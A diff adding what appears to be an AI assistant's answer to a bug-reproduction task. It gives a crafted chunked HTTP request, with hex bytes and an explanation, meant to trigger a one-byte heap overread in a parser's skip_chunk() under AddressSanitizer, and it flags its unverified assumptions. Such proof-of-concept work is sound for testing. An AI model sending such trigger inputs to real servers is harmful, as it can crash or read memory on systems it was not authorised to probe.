@@ -1,0 +1,20 @@
+I can draft this trigger, but the harness config was not provided ("see harness"), so I can't confirm the server settings or that the sanitizer fires. The frame below is built from the bug description alone.
+
+The bug needs the request body to end exactly at the CR after a 3-byte chunk payload, so `len == i + 1`. The frame is:
+
+```
+POST / HTTP/1.1\r\n
+Host: a\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+3\r\n
+ab\r
+```
+
+```json
+{
+  "hex_bytes": "50 4f 53 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 61 0d 0a 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0d 0a 0d 0a 33 0d 0a 61 62 0d",
+  "explanation": "Request line 'POST / HTTP/1.1' (CRLF), header 'Host: a' (CRLF), header 'Transfer-Encoding: chunked' (CRLF), blank line (CRLF) ending the headers. Body: chunk-size line '3' (CRLF), then 3 payload bytes 'a','b','\\r' with no trailing bytes. The payload's final '\\r' is the last byte of the buffer, so when skip_chunk() reaches index i pointing at that '\\r' and checks buf[i+1], len == i+1 passes the 'len < i + 1' test and reads one byte past the end. Whether that read is out of bounds depends on the buffer being heap-allocated at exactly this length; the frame must not be padded or followed by more data.",
+  "expected_effect": "AddressSanitizer should report a heap-buffer-overflow READ of size 1 inside skip_chunk(), at the byte just past the end of the request body buffer. Without ASan the read may silently return garbage or not crash, so the oracle depends on the sanitizer build. Unverified: the harness's exact config, whether the server copies the body into a separately sized allocation, and the chunk-size parsing path are unknown to me, so the frame may need adjusting once the harness is available."
+}
+```
